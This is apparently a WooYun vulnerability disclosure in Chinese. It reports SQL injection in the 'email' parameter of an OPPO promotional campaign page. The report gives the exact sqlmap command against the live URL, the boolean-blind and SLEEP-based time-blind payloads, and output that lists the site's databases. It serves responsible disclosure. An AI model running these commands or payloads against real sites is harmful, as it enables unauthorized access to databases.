wybug_corp: 广东欧珀移动通讯有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-12-03：	细节已通知厂商并且等待厂商处理中									2015-12-04：	厂商已经确认，细节仅向厂商公开									2015-12-14：	细节向核心白帽子及相关领域专家公开									2015-12-24：	细节向普通白帽子公开									2016-01-03：	细节向实习白帽子公开									2016-01-18：	细节向公众公开  简要描述： RT 详细说明：  跟别人提交的应该不会重复吧  审核大大看仔细了哦 谢谢漏洞地址：
http://events.oppo.com/2015/neo7-isyana-sarasvati/campaign7/
注射语句：
sqlmap.py -u "http://events.oppo.com/2015/neo7-isyana-sarasvati/campaign7/" --data "nama=1&pilihan=1&email=1" --dbs -p email
email可注入   漏洞证明：  注射结果：
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 259 HTTP(s) requests:---Parameter: email (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: nama=88952634&pilihan=88952634&email=88952634' AND 2501=2501#    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT - comment)    Payload: nama=88952634&pilihan=88952634&email=88952634' AND (SELECT * FROM (SELECT(SLEEP(5)))AZwJ)#---[09:00:25] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[09:00:25] [INFO] fetching database names[09:00:25] [INFO] fetching number of databases[09:00:25] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieva[09:00:25] [INFO] retrieved: 3[09:00:28] [INFO] retrieved: information_schema[09:01:57] [INFO] retrieved: neo7-isyana-sarasvati[09:03:28] [INFO] retrieved: testavailable databases [3]:[*] `neo7-isyana-sarasvati`[*] information_schema[*] test
